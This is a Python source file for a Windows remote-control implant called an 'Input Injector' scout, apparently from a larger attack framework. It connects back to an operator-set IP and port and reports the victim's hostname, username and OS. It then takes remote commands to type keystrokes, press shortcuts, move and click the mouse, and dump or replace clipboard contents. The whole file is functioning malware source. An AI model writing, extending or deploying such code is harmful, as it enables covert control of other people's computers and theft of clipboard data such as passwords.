import socket, pickle, pyautogui, os
from platform import platform
from getpass import getuser
from time import sleep
from win32clipboard import OpenClipboard, CloseClipboard, EmptyClipboard, SetClipboardText, GetClipboardData

port = !!!!!
ip_addr = @@@@@
lkey = #####
End = $$$$$
skey = %%%%%
time_to_sleep = ^^^^^
type_of_scout = 'Input Injector'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [skey, lkey, userinfo, type_of_scout, operating_sys]
powershell = False
s = None
pyautogui.FAILSAFE = False

valid_keys = ['\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
              ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
              '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
              'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
              'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
              'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
              'browserback', 'browserfavorites', 'browserforward', 'browserhome',
              'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
              'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
              'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
              'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
              'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
              'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
              'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
              'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
              'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
              'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
              'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
              'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
              'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
              'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
              'command', 'option', 'optionleft', 'optionright']

help_menu = '''\nInput Injector  Menu
====================

   Global Commands :
      banner                            Display a banner
      clear                             Clear the screen
      help                              Show the help menu
      local <shell command>             Locally execute a shell command
      python                            Enter the system python interpreter
      quit                              Quit the framework

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill the scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Handler commands :
      back                              Move back to scout handler

   Key Injection commands :
      pr <key>                          Press a key
      sh <keys separated with spaces>   Use a keyboard shortcut
      ty <string>                       Type out a string
      valids                            Show all valid keys to use on target

   Mouse Injection commands :
      click_left                        Click the left mouse button
      click_right                       Click the right mouse button
      move_to <X cord> <Y cord>         Move mouse to XY coordinates on screen

   Clipboard commands :
      clip_clear                        Clear clipboard content
      clip_dump                         Show clipboard content
      clip_set <string>                 Edit/set the clipboard content

   Screen command :
      dimensions                        Get the dimensions/size of screen in terms of XY
      position                          Get current mouse position on screen in terms of XY coordinates\n'''

def recvall(tar_socket):
    tar_socket.settimeout(None)
    data = tar_socket.recv(9999)
    if not data:
        return ''
    while True:
        if data.endswith(End):
            try:
                tar_socket.settimeout(1)
                more_data = tar_socket.recv(9999)
                if not more_data:
                    return data[:-len(End)]
                data += more_data
            except (socket.timeout,socket.error):
                tar_socket.settimeout(None)
                return data[:-len(End)]
        else:
            more_data = tar_socket.recv(9999)
            data += more_data

def inject_input(injection_type, arg):
    try:
        if injection_type == 'ty':
            if not arg:
                s.sendall('[-]Supply a key as an arg'+End)
                return
            pyautogui.typewrite(arg)
            s.sendall('[+]Injected typewritten character/s' + End)
        elif injection_type == 'pr':
            if not arg:
                s.sendall('[-]Supply a key as an arg'+End)
                return
            pyautogui.press(arg)
            s.sendall('[+]Injected pressed key' + End)
        elif injection_type == 'sh':
            if not arg:
                s.sendall('[-]Supply a key as an arg'+End)
                return
            if ' ' in arg:
                arg = arg.split(' ')
                for key in arg:
                    pyautogui.keyDown(key)
                for key in reversed(arg):
                    pyautogui.keyUp(key)
                s.sendall('[+]Injected keyboard shortcut' + End)
            else:
                pyautogui.hotkey(arg)
                s.sendall('[+]Injected keyboard shortcut' + End)
        elif injection_type == 'valids':
            tar_list = '|/'.join(valid_keys)
            s.sendall(tar_list + End)
        elif injection_type == 'clip_clear':
            OpenClipboard()
            EmptyClipboard()
            s.sendall('[+]Cleared clipboard content' + End)
            CloseClipboard()
        elif injection_type == 'clip_dump':
            OpenClipboard()
            try:
                injection_type = GetClipboardData()
            except TypeError:
                s.sendall('[+]Clipboard content is empty' + End)
                return
            CloseClipboard()
            s.sendall('[+]Dumped content : ' + injection_type + End)
        elif injection_type == 'clip_set':
            if not arg:
                s.sendall('[-]Input a string' + End)
                return
            OpenClipboard()
            EmptyClipboard()
            SetClipboardText(arg)
            CloseClipboard()
            s.sendall('[+]Injected cliboard data' + End)
        elif injection_type == 'click_left':
            pyautogui.click(button='left')
            s.sendall('[+]Injected left mouse click' + End)
        elif injection_type == 'click_right':
            pyautogui.click(button='right')
            s.sendall('[+]Injected right mouse click' + End)
        elif injection_type == 'move_to':
            if not arg:
                s.sendall('[-]Supply a coord as an arg'+End)
                return
            try:
                arg = arg.split(' ')
                cord_one = int(arg[0])
                cord_two = int(arg[1])
                pyautogui.moveTo(x=cord_one, y=cord_two)
                s.sendall('[+]Injected mouse movement' + End)
            except:
                s.sendall('[-]Input X and Y coordinates as integers' + End)
                return
        elif injection_type == 'dimensions':
            dimensions = pyautogui.size()
            dimensions = '[+]Dimensions of screen : ' + str(dimensions[0]) + ' x ' + str(dimensions[1])
            s.sendall(dimensions + End)
        elif injection_type == 'position':
            current = pyautogui.position()
            current = '[+]Current mouse position : ' + str(current[0]) + ' x ' + str(current[1])
            s.sendall(current + End)
        else:
            s.sendall('[-]Unknown command "' + injection_type + '", run "help" for help menu' + End)
    except Exception as e:
        s.sendall('[-]Error injecting keystrokes : ' + str(e))


def main():
    global s
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except:
                sleep(time_to_sleep)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                #s.settimeout(None)
                data = recvall(s)
                command = data.split(' ', 1)[0]
                if command == 'help':
                    s.sendall(help_menu+End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    sleep(5)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data.split(' ')[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    s.shutdown(1)
                    s.close()
                    for i in range(sleep_time):
                        sleep(1)
                    break
                elif command == 'ping':
                    s.sendall('[+]Scout is alive' + End)
                else:
                    arg = data.split(' ', 1)
                    if len(arg) > 1:
                        inject_input(command, arg[1])
                    else:
                        inject_input(command, None)
            except (socket.error, socket.timeout):
                try:
                    s.shutdown(1)
                    s.close()
                    break
                except socket.error:
                    break
            except Exception as e:
                try:
                    if command:
                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
                    else:
                        s.sendall('[-]Error message : ' + str(e) + End)
                except:
                    s.shutdown(1)
                    s.close()
                    break


main()
